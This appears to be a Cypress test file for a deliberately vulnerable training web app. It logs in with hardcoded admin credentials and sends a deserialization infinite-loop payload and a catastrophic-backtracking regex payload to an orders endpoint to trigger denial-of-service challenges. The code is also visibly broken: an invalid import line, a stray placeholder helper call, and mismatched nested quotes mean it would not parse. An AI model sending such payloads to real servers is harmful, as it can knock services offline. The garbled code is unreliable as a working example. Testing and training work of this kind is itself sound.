import * as Helpers from './utils/test_helpers';
import { Helpers.test_helper_1, Helpers.test_helper_2 } from './utils/test_helpers';

Helpers.test_helper_17(); // Replaced with helper function

describe('/b2b/v2/order', () => {
  describe('challenge 'rce'', () => {
    it('an infinite loop deserialization payload should not bring down the server', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.login({ email: 'admin', password: 'admin123' })

          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/b2b/v2/orders/`,
              {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json',
                  Authorization: `Bearer ${localStorage.getItem('token')}`
                },
                body: JSON.stringify({
                  orderLinesData: '(dos();)()'
                })
              }
            )
            if (response.status === 500) {
              console.log('Success')
            }
          })
          cy.expectChallengeSolved({ challenge: 'Blocked RCE DoS' })
        }
      })
    })
  })

  describe('challenge 'rceOccupy'', () => {
    it('should be possible to cause request timeout using a recursive regular expression payload', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.login({ email: 'admin', password: 'admin123' })
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/b2b/v2/orders/`,
              {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json',
                  Authorization: `Bearer ${localStorage.getItem('token')}`
                },
                body: JSON.stringify({
                  orderLinesData:
                    '/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')'
                })
              }
            )
            if (response.status === 503) {
              console.log('Success')
            }
          })
          cy.expectChallengeSolved({ challenge: 'Successful RCE DoS' })
        }
      })
    })
  })
})
